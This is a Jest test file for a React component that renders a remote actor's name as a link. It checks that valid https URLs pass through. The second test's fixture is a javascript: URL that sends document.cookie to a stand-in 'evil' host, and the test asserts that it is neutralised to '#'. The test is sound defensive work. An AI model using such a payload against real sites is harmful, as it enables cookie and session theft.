/**
 * @jest-environment jsdom
 */

import '@testing-library/jest-dom';
import { render } from '@testing-library/react';
import { nameField } from '../index';
import type { Actor } from '../../../../types';

// Mock WordPress dependencies.
jest.mock( '@wordpress/i18n', () => ( {
	__: ( text: string ) => text,
} ) );

const createMockActor = ( url: string ): Actor =>
	( {
		id: 1,
		actor_info: {
			username: 'alice',
			name: 'Alice',
			icon: '',
			url,
			webfinger: 'alice@example.com',
			identifier: 'https://example.com/@alice',
		},
	} ) as unknown as Actor;

const renderName = ( item: Actor ): HTMLElement => {
	const RenderComponent = nameField.render;
	const { container } = render( <RenderComponent item={ item } field={ nameField as never } /> );
	return container;
};

describe( 'nameField render', () => {
	it( 'renders a valid http(s) actor URL as the link target', () => {
		const link = renderName( createMockActor( 'https://example.com/@alice' ) ).querySelector( 'a' );
		expect( link ).toHaveAttribute( 'href', 'https://example.com/@alice' );
	} );

	it( 'neutralizes a javascript: URL from a remote actor', () => {
		const link = renderName( createMockActor( "javascript:fetch('//evil/?c='+document.cookie)" ) ).querySelector(
			'a'
		);
		// Falls back to a harmless anchor instead of the script-executing href.
		expect( link ).toHaveAttribute( 'href', '#' );
	} );
} );
